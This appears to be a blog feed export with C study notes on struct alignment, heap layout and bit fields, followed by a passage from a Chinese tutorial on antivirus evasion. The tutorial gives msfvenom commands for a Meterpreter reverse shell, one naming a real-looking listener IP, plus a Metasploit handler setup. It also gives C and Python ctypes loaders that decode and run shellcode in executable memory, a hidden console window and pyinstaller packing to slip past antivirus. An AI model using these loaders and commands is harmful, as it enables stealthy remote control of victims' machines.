<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagStudent</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">char</span> szName[<span class="number">5</span>];</span><br><span class="line">    <span class="type">char</span> nGender;</span><br><span class="line">    <span class="type">int</span> nAge;</span><br><span class="line">    <span class="type">double</span> dblWeight;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> wID;</span><br><span class="line">	<span class="type">float</span> fHeight;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tagStudent</span> <span class="title">stu</span> =</span> &#123;</span><br><span class="line">		<span class="string">&quot;Jack&quot;</span>, </span><br><span class="line">         <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">         <span class="number">25</span>,</span><br><span class="line">         <span class="number">80.0</span>, </span><br><span class="line">		<span class="number">9527</span>,  </span><br><span class="line">		<span class="number">185.0f</span>, </span><br><span class="line">	&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(stu)); </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/02/Notes-C/14.png" class title="This is an example image">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">设编译对齐值为Zp</span></span><br><span class="line"><span class="comment">设结构体成员的地址和结构体首地址之差为offset</span></span><br><span class="line"><span class="comment">设结构体成员类型为member type</span></span><br><span class="line"><span class="comment">必须满足：</span></span><br><span class="line"><span class="comment">offset % min(Zp,sizeof(member type)) == 0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">定义结构体自身的对齐值为 StructAlig</span></span><br><span class="line"><span class="comment">StructAlig = max(sizeof(member1 type),sizeof(member2 type),...,sizeof(memberEnd type))</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">设整个结构体的空间长度为 size</span></span><br><span class="line"><span class="comment">必须满足：</span></span><br><span class="line"><span class="comment">size % min(Zp,StructAlig) == 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagStudent</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">char</span> szName[<span class="number">5</span>];   <span class="comment">//+0 =&gt; 0%(min(8,sizeof(char)) =&gt; 0%(min(8,1)</span></span><br><span class="line">    <span class="type">int</span> nAge;		 <span class="comment">//+8 &lt;=  +6 =&gt; 6%(min(8,4))</span></span><br><span class="line">    <span class="type">double</span> dblWeight; <span class="comment">// +16</span></span><br><span class="line">    <span class="type">char</span> nGender;     <span class="comment">// +24</span></span><br><span class="line">    <span class="type">float</span> fHeight;    <span class="comment">// +28</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> wID; <span class="comment">//+32，这里指的是偏移量，还要加上short int</span></span><br><span class="line">&#125;; <span class="comment">// 34 % min(8,8) == 0 =&gt; 40</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tagStudent</span> <span class="title">stu</span> =</span> &#123;</span><br><span class="line">		<span class="string">&quot;Jack&quot;</span>, </span><br><span class="line">         <span class="number">25</span>,</span><br><span class="line">         <span class="number">80.0</span>,</span><br><span class="line">         <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">         <span class="number">185.0f</span>, </span><br><span class="line">         <span class="number">9527</span></span><br><span class="line">	&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(stu)); </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>共用体（共用同一个内存结构，以最大成员字节开辟空间）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">unScore</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> chLevel;</span><br><span class="line">    <span class="type">float</span> fPoint;</span><br><span class="line">    <span class="type">char</span> szTest[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// pScore-&gt;szTest = xxx  =&gt; *(char *)&amp;pScore-&gt;szTest</span></span><br></pre></td></tr></table></figure>



<h2 id="12、堆"><a href="#12、堆" class="headerlink" title="12、堆"></a>12、堆</h2><p>栈分配和堆分配的区别？能否识别出内存中栈地址和堆地址</p>
<p>申请堆也是存储在栈，不过存储的是堆的地址，类似于常量地址</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> *envp[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> *p = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">    *p = <span class="number">999</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> *psz = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">20</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(psz, <span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> *psz2 = (<span class="type">char</span> *)<span class="built_in">realloc</span>(p, <span class="number">1</span>);</span><br><span class="line">    psz2[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    p = (<span class="type">int</span> *)<span class="built_in">realloc</span>(psz2, <span class="number">8</span>);</span><br><span class="line">    p[<span class="number">0</span>] = <span class="number">0x6666</span>;</span><br><span class="line">    p[<span class="number">1</span>] = <span class="number">0x8888</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">free</span>(psz);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>堆结构分析：</p>
<p>堆的起始地址要减20字节，堆存储有附加数据（貌似是调试状态才有），</p>
<img src="/2024/01/02/Notes-C/15.png" class title="This is an example image">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;crtdbg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> malloc(n) _malloc_dbg(n, _NORMAL_BLOCK, __FILE__, __LINE__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *p = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">    *p = <span class="number">999</span>;</span><br><span class="line">    <span class="comment">//free(p);</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> *psz = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">20</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(psz, <span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> *psz2 = (<span class="type">char</span> *)<span class="built_in">realloc</span>(p, <span class="number">1</span>);</span><br><span class="line">    psz2[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    p = (<span class="type">int</span> *)<span class="built_in">realloc</span>(psz2, <span class="number">80</span>);</span><br><span class="line">    p[<span class="number">0</span>] = <span class="number">0x6666</span>;</span><br><span class="line">    p[<span class="number">1</span>] = <span class="number">0x8888</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">free</span>(psz);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只有调试版在释放堆空间时才填充数据，发布版是残留，发布版没有堆内没有调试信息</p>
<p>调试小技巧</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;crtdbg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> malloc(n) _malloc_dbg(n, _NORMAL_BLOCK, __FILE__, __LINE__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> *envp[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *psz = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(<span class="string">&quot;Hello world!&quot;</span>))</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="built_in">strpcy</span>(psz, <span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(psz);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/02/Notes-C/16.png" class title="This is an example image">

<p>位运算（针对二进制的运算，运算前要转换成十进制）：</p>
<p>是一种底层运算，加减本质上都是位运算</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">位是一种二进制运算</span><br><span class="line">A and 1 = A</span><br><span class="line">A or 0 = A</span><br><span class="line">A and 0 = 0</span><br><span class="line">A or 1 = 1</span><br><span class="line">A xor A = 0</span><br><span class="line">A xor 0 = A</span><br><span class="line">A xor 1 = not A</span><br><span class="line">A and not A = 0</span><br><span class="line">A or not A = 1</span><br><span class="line"></span><br><span class="line">此处的1默认为 1111</span><br><span class="line">假设A为1010</span><br></pre></td></tr></table></figure>

<p>有符号数移位补符号位，无符号位移位补0</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">myabs</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">7</span>; <span class="comment">// 无符号位 0111</span></span><br><span class="line">    i = i &gt;&gt; <span class="number">1</span>; <span class="comment">// 3</span></span><br><span class="line">    i = <span class="number">-1</span>; <span class="comment">// 1001</span></span><br><span class="line">    i = i &gt;&gt; <span class="number">1</span>; <span class="comment">// 0xffffffff &gt;&gt; 1 = 0x7fffffff</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> j = <span class="number">7</span>;</span><br><span class="line">    j = j &gt;&gt; <span class="number">1</span>; <span class="comment">//3</span></span><br><span class="line">    i = <span class="number">-1</span>;</span><br><span class="line">    i = i &gt;&gt; <span class="number">1</span>; <span class="comment">// 0xffffffff &gt;&gt; 1 = 0xfffffffff</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n = myabs(<span class="number">-5</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">myabs</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//具体数学</span></span><br><span class="line">    <span class="comment">//-5 = 1101 =&gt; 1010+1 = 1011 = 00 00 00 03 右移31位，补符号位1，第一位1，左移补31位1</span></span><br><span class="line">	<span class="type">int</span> i = n &gt;&gt; <span class="number">31</span>;<span class="comment">//if n &gt;= 0, i=0; else i = 0xffffffff = -1</span></span><br><span class="line">    n = n ^ i;<span class="comment">//if i = 0, n = n; else i = 0xffffffff, n = ~n</span></span><br><span class="line">    <span class="keyword">return</span> n - i;<span class="comment">//if i = 0, n - i = n; else i = -1, n - i = n + 1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n = myabs(<span class="number">-5</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>位运算2：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ADD 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDT 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUE 8</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> nPrivilege = <span class="number">0</span>;</span><br><span class="line">    nPrivilege = nPrivilege | DEL;  <span class="comment">//二进制运算，或0010</span></span><br><span class="line">    nPrivilege = nPrivilege | EDT;  <span class="comment">//二进制运算，或0100</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (nPrivilege &amp; ADD)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nPrivilege &amp; DEL)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;DEL&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nPrivilege &amp; EDT)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;EDT&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (nPrivilege &amp; QUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;QUE&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>位运算3：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagPrivilege</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> add:<span class="number">1</span>;<span class="comment">//分配1位</span></span><br><span class="line">    <span class="type">int</span> del:<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> edt:<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> que:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tagPrivilege</span> <span class="title">pri</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    pri.del = <span class="number">1</span>;</span><br><span class="line">    pri.edt = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> n = pri.del; <span class="comment">// n = -1 内存存的是补码，默认int有4位，此处被限制为1变成符号位</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    unsigned int edt:1;</span></span><br><span class="line"><span class="comment">    n = pri.edt; // n = 1</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (pri.add)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pri.del)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;DEL&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pri.edt)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;EDT&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (pri.que)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;QUE&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>位运算4：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//xxxxxxxxxxxxxxxxxxxxxx qq eeee ddd a</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagPrivilege</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> add:<span class="number">1</span>;<span class="comment">//分配1位</span></span><br><span class="line">    <span class="type">int</span> del:<span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> : <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//xxxxxxxxxxxxxxxxxxxxxxxxxx qq eeee </span></span><br><span class="line">    <span class="comment">//xxxxxxxxxxxxxxxxxxxxxxxxxxxx ddd a</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> edt:<span class="number">4</span>;</span><br><span class="line">    <span class="type">int</span> que:<span class="number">2</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tagPrivilege</span> <span class="title">pri</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    pri.del = <span class="number">9</span>; <span class="comment">// pri.del = 1 001B = 1  超长度，看第n位就行</span></span><br><span class="line">    pri.edt = <span class="number">20</span>; <span class="comment">// pri.edt = 1 0100b = 4</span></span><br><span class="line">    <span class="type">int</span> n = pri.del; <span class="comment">// n = -1 内存存的是补码，默认int有4位，此处被限制为1变成符号位</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    unsigned int edt:1;</span></span><br><span class="line"><span class="comment">    n = pri.edt; // n = 1</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (pri.add)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pri.del)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;DEL&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pri.edt)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;EDT&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (pri.que)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;QUE&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.yuque.com/books/share/08f3006b-131e-4f17-85cb-ab78f322c090">https://www.yuque.com/books/share/08f3006b-131e-4f17-85cb-ab78f322c090</a></p>
]]></content>
      <categories>
        <category>x队</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>免杀对抗之源码免杀</title>
    <url>/2022/09/03/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97%E4%B9%8B%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<p><strong>0x01 免杀分类</strong></p>
<p>渗透测试中常需要免杀马，这块的内容交叉且形式多样。常见的免杀方式，源码混淆、DLL文件替换、文件修改、加壳、花指令免杀、签名等。免杀的内容比较偏向破解、反编译范畴的安全研究，也是武器库中的必不可少的部分。本文章是系列教程，各种免杀方式都会涉及，本次分享的是源码免杀。</p>
<p><strong>0x02 源码免杀</strong></p>
<p>这里以Python做免杀为例，其他语言如C#、GO、Ruby等免杀思路相同。</p>
<p>免杀的大致步骤可以分为如下，视情况可以采用部分步骤：</p>
<ul>
<li>加载器选择-ctypes-DLL&amp;其他，加载shellcode的组件</li>
<li>加密器选择-base64&amp;hex&amp;xor&amp;aes，加密shellcode的组件、异或</li>
<li>执行器选择-github上不是一大堆，用于执行shellcode的组件</li>
<li>打包器选择-pyinstaller&amp;py2exe，把代码打包成可执行文件的组件</li>
</ul>
<p>免杀思路一：msf生成C语言shellcode，编写C程序调用shellcode生成exe可执行文件</p>
<p>其实这部分无作任何免杀，只是换了调用方式，但还是能过电脑管家的（无语）</p>
<p>msf操作步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#生成C语言shellcode，此处生成的shellcode是程序执行在内存中的状态</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=yourip lport=6688 -f c</span><br><span class="line">#监听主机上线</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 6688</span><br></pre></td></tr></table></figure>

<p>C语言调用二进制生成exe代码（需要采用32位执行）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//此代码用于将msf生成的shellcode打包生成exe</span></span><br><span class="line"><span class="comment">//可能有同学要问了，为什么生成C语言的二进制码还需要利用C语言打包执行。其实exe程序运行时在内存中是二进制码，现在msf生成的是二进制码，需要打包成exe才能被执行</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">//windows控制台程序不出黑窗口</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) </span></span><br><span class="line"><span class="comment">//此处放msf生成的shellcode</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* Memory;</span><br><span class="line">    <span class="comment">// 申请EXECUTE属性内存</span></span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">// 拷贝shellcode</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// 执行shellcode</span></span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>免杀思路二：利用msf生成加密的C语言shellcode，再利用python去调用（免杀思路一是采用C语言调用）</p>
<p>python采用ctypes模块引用&amp;执行C语言代码</p>
<p>此处讲解个Python调用C语言生成的动态链接库的小案例：</p>
<p>vs生成dll文件小tips:（生成解决方案）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">TestCtypes</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I like eating you\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>python采用ctypes调用生成的dll文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#加载Dll1.dll</span></span><br><span class="line">lib=CDLL(<span class="string">&#x27;./Dll1.dll&#x27;</span>)</span><br><span class="line"><span class="comment">#调用当前库方法</span></span><br><span class="line">lib.TestCtypes()</span><br></pre></td></tr></table></figure>



<p>此处打包器选择pyinstaller</p>
<p>msf生成base64加密shellcode:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64 lhost=47.94.236.117 lport=6688 -f c</span><br></pre></td></tr></table></figure>

<p>python调用Ctypes模块解码调用shellcode（注：此处python必须为32位的）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#此处为msf生成的加密shellcode,去掉&quot;和;</span></span><br><span class="line">encode_shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = base64.b64decode(encode_shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行shellcode</span></span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>pyinstaller.exe -F -w miansha-df.py #用于将py文件生成exe文件  （注：此处python必须为32位的）</p>
<p>免杀思路三：外部shellcode加载+特征语句定位加密（过hr、360）</p>
